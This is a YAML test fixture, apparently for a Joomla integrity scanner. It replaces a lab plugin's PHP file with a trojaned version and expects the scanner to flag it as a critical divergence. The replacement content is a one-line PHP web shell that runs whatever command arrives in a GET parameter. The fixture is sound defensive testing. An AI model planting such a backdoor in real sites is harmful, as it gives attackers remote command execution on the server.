# Positivo (fase 2c, Task 7): archivo ejecutable atribuido de
# plg_system_labplg con contenido distinto al del paquete oficial (troyano en
# un plugin de confianza) → J0W-EXT-008 critical (D5: divergencia en
# ejecutable = crítico). El plugin es el tipo de mayor valor para esta prueba:
# un plugin system se ejecuta en TODAS las peticiones.
case: ext-plg-trojan
base:
  cms: joomla
  version: "1.1.0"
expect:
  exit_code: 1
  findings:
    - rule_id: J0W-EXT-008
      subject: plugins/system/labplg/labplg.php
      min_severity: critical
mutations:
  - op: add_extension
    kind: plugin
  - op: add_extension_baseline
    kind: plugin
  - op: replace_file
    path: plugins/system/labplg/labplg.php
    content: "<?php\n// troyano: puerta trasera plantada sobre un plugin legítimo\nsystem($_GET['c']);\n"
